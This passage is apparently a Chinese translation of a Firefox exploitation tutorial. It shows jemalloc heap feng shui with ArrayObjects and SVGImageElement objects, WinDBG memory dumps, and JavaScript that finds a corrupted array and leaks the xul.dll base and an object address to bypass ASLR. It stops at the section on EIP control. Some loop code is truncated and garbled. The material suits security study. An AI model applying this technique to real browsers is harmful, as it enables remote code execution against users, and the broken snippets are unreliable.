        0:000> !py c:\\tmp\\pykd_driver jeinfo 141ad200
        [shadow] address 0x141ad200
        ...
        [shadow] run 0x141ad000 is the current run of bin 0x00600608
        [shadow] address 0x141ad200 belongs
                        to region 0x141ad200 (size class 0256)
我们可以看到，container ArrayObject的ArrayObject元素确实位于jemalloc堆上，特别是大小为256的区域。  
而且，它们彼此相邻。
## 5.2 jemalloc风水
堆风水指的是堆的操纵，目的是能准确的对堆进行布置（用选的object）以帮助后续的利用[FSJ]。 有了前面几节的知识，我们现在可以：  
1）将我们的ArrayObjects移出nursery ，并将其与metadata一起移动到jemalloc堆上。
2）在jemalloc的run中布置空洞的位置，并触发垃圾回收，以实际通过后续分配使这些空洞的内存可回收。
3）回收空洞的位置（因为jemalloc是LIFO模式）并创建有用的堆排序。
假设我们在特定大小的DOM类中存在堆溢出漏洞，我们可以继续使用我们的方法。 举个例子，这里将使用一个典型的Firefox
DOM类，它有一个vtable，可以从JavaScript分配。 使用shadow我们可以查找这样一个DOM类，其对象的大小为256字节：
    0:000> !py c:\\tmp\\pykd_driver symbol
        [shadow] usage: symbol [-vjdx] 
        [shadow] options:
        [shadow]    -v  only class symbols with vtable
        [shadow]    -j  only symbols from SpiderMonkey
        [shadow]    -d  only DOM symbols
        [shadow]    -x  only non-SpiderMonkey symbols
        0:000> !py c:\\tmp\\pykd_driver symbol -dv 256
        [shadow] searching for DOM class symbols of size 256 with vtable
        ...
        [shadow] 0x100 (256) class mozilla::dom::SVGImageElement (vtable: yes)
在用ArrayObjects喷涂jemalloc堆之后，我们交错释放掉ArrayObjects，来创建内存中的空洞的位置。
然后触发垃圾回收以使这些空洞的位置被回收。
    for(var i = 0; i  !py c:\\tmp\\pykd_driver jerun 0x15b11000
        [shadow] searching for run 0x15b11000
        [shadow] [run 0x15b11000] [size 016384] [bin 0x00600608]
                    [region size 0256] [total regions 0063] [free regions 0000]
        [shadow] [region 000] [used] [0x15b11100] [0x0]
        [shadow] [region 001] [used] [0x15b11200] [0x69e0cf70]
        [shadow] [region 002] [used] [0x15b11300] [0x0]
        [shadow] [region 003] [used] [0x15b11400] [0x69e0cf70]
上面我们可以看到 0x15b11100 处是run 的第一个 region ，它被分配，并且它的前4个字节为零，对应于ArrayObject的标志。
0x15b11200 的region处有一个0x69e0cf70的第一个双字节，它是SVGImageElement的vftable指针。  
让我们更详细地研究一下：
    0:000> dd 15b11100 l?80
        [ Metadata of ArrayObject at region 000 ]
                  flags    initlen  capacity length
        15b11100  00000000 0000001e 0000001e 0000001e
        [ Contents of the ArrayObject ]
        15b11110  45464645 ffffff81 47484847 ffffff81
        15b11120  45464645 ffffff81 47484847 ffffff81
        ...
        15b111d0  45464645 ffffff81 47484847 ffffff81
        15b111e0  45464645 ffffff81 47484847 ffffff81
        15b111f0  45464645 ffffff81 47484847 ffffff81
        [ SVGImageElement object at region 001 ]
        15b11200  69e0cf70 69e0eba0 1a590ea0 00000000
        15b11210  11bfc830 00000000 00020008 00000000
        15b11220  00000000 00000000 15b11200 00000000
        15b11230  00000007 00000000 00090000 00000000
        15b11240  69e0d1f4 00000000 00000000 00000000
        15b11250  00000000 00000000 69e0bd38 00000000
        ...
        [ The next ArrayObject starts here, region 002]
                  flags    initlen  capacity length
        15b11300  00000000 0000001e 0000001e 0000001e
        15b11310  45464645 ffffff81 47484847 ffffff81
        15b11320  45464645 ffffff81 47484847 ffffff81
        ...
        [ The SVGImageElement object at region 003 ]
        15b11400  69e0cf70 69e0eba0 1a590ea0 00000000
        ...
        0:000> dds 15b11200  
        15b11200  69e0cf70 xul!mozilla::dom::SVGImageElement::`vftable'
我们确实以我们想要的方式布置了堆。 下一步是通过假定的SVGImageElement溢出错误搜索 metadata 已损坏的ArrayObject。
以下代码片段假定我们已覆盖所有metadata （16个字节）并使用0x666作为initlen，capacity 和length的新值。
    var pwned_index = 0;
        for(var i = 0; i  500)
            {
                var pwnstr = "[*] corrupted array found at index: " + i;
                log(pwnstr);
                pwned_index = i;
                break;
            }
        }
我们被破坏的ArrayObject现在允许我们将相应的JavaScript数组索引到其结尾之外，也就是可以溢出，并转换为相邻的SVGImageElement对象。
由于我们已经喷洒了长度为30（0x1e）的数组，因此我们可以将索引为30的类型为double的jsval索引到SVGImageElement对象的前8个字节中（因为索引29是数组的最后一个元素）。
    0:000> dd 15b11300 l?80
        [ Corrupted metadata of an ArrayObject ]
                  flags    initlen  capacity length
        15b11300  00000000 00000666 00000666 00000666
                  [    index 0    ] [   index 1     ]
        15b11310  45464645 ffffff81 47484847 ffffff81
                  [    index 2    ] [   index 3     ]
        15b11320  45464645 ffffff81 47484847 ffffff81
        ...
        15b113c0  45464645 ffffff81 47484847 ffffff81
        15b113e0  45464645 ffffff81 47484847 ffffff81
                  [    index 28   ] [   index 29    ]
        15b113f0  45464645 ffffff81 47484847 ffffff81
                  [    index 30   ] [   index 31    ]
        15b11400  69e0cf70 69e0eba0 1a590ea0 00000000
        15b11410  11bfc830 00000000 00020008 00000000
                                    [   index 35    ]
        15b11420  00000000 00000000 15b11400 00000000
        15b11430  00000007 00000000 00090000 00000000
        ...
        15b114e0  e4000201 00000000 00000000 e4010301
        15b114f0  06000106 00000001 00000000 e5e50000
        0:000> g
        [*] corrupted array found at index: 31147
## 5.3 xul.dll基地址泄漏与我们在内存中的定位
我们可以从上面的索引30中读取，但注意，因为我们使用数组来执行此操作，所以将两个32位值视为double jsval（因为对应于该类型的一个32位值）
64位jsval的值小于0xFFFFFF80）。  
即是数组有标志值0xffffff81 ，就跟在数组每个数据之后，0xffffff81 是我们通过数组操作无法读取的。
因此，我们需要实现两个辅助函数;
一个将64位值读取为double并将其转换为相应的原始字节（名为double_to_bytes（）），另一个将原始字节转换为十六进制表示（名为bytes_to_hex（））。
从索引30读取为我们提供了SVGImageElement的vftable指针，我们只需要从xul.dll中减去已知的非ASLRed指针。
    var val_hex = \
            bytes_to_hex(double_to_bytes(container[pwned_index][30]));
        var known_xul_addr = 0x121deba0; // 41.0.1 specific
        var leaked_xul_addr = parseInt(val_hex[1], 16);
        var aslr_offset = leaked_xul_addr - known_xul_addr;
        var xul_base = 0x10000000 + aslr_offset;
        var val_str = \
            "[*] leaked xul.dll base address: 0x" + xul_base.toString(16);
        log(val_str);
在上面地址为 0x15b11428 的SVGImageElement对象中，索引为索引为35的已损坏数组，指针指向对象本身的开头（0x15b11400）。
这些指针存在于大多数Firefox DOM对象，用于垃圾回收。
通过从我们损坏的数组的索引35中泄漏这个地址，我们可以得到jemalloc堆中所有这些对象的位置。 这对于fake
对象非常有用（我们将在下面的部分中进行）。
    val_hex = \
            bytes_to_hex(double_to_bytes(container[pwned_index][35]));
        val_str = "[*] victim SVGImageElement object is at: 0x" + val_hex[0];
        log(val_str);
我们再次使用两个辅助函数来读取双jsvals，并将它们转换为十六进制。  
在WinDBG中：
    0:000> g
        [*] corrupted array found at index: 31147
        [*] leaked xul.dll base address: 0x67c30000
        [*] victim SVGImageElement object is at: 0x15b11400
        Breakpoint 0 hit
        eax=002cf801 ebx=1160b8b0 ecx=00000001 edx=00000002 esi=697f1386
        edi=00000000 eip=697f1386 esp=0038cce0 ebp=0038cd6c iopl=0
        nv up ei pl nz na po nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00000202
        xul!js::math_asin:
        697f1386 push    ebp
        0:000> lm m xul
        start    end        module name
        67c30000 6a162000   xul
事实上，我们可以使用WinDBG的lm命令验证我们是否正确泄露了xul.dll的基础。 此外，我们现在知道SVGImageElement对象的地址。
完整的代码是存档中的文件'svg-leak.html'。
## 5.4 EIP控制
被损坏的ArrayObject当然也可以用于写入内存。